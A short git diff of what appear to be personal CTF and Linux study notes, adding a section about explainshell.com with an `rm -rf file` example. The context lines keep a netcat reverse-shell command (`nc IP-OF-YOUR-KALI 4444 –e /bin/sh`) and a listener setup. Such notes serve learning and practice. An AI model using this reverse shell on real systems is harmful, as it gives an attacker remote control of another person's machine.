@@ -57,6 +57,12 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/sh`
 - *Note: We have to set a listener prior to this with `rlwrap nc -lvp 4444`*
 
+## Explainshell.com
+
+- [This website](https://explainshell.com/) is relly helpful to understand what a specific linux command does. Here is an example with `rm -rf file`  
+![image](https://user-images.githubusercontent.com/96747355/175054655-9a49193f-38a3-4cc7-92dc-e1d6f716aaab.png)
+
+
 ## Resources
 
 {% embed url="https://askubuntu.com/questions/470966/shortcut-to-clear-command-line-terminal" %} Shortcut to clear command line terminal {% endembed %}
